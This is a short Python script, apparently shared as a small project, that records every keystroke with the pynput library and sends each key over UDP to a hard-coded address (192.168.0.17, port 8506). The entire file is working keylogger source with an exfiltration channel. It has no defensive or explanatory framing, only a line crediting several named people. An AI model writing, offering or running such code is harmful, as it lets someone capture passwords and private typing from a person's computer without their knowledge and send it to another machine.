###
# Used with permission from Robert, Peyman, Khang, and Anderson
###

from pynput.keyboard import Key, Listener
import socket

UDP_IP = "192.168.0.17"
UDP_PORT = 8506
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def on_press(key):
    try:
        data = format(key.char)
    except AttributeError:
        data = format(key)
    data = bytes(data.encode('ascii'))
    sock.sendto(data, (UDP_IP, UDP_PORT))

with Listener(on_press=on_press) as listener:
    listener.join()
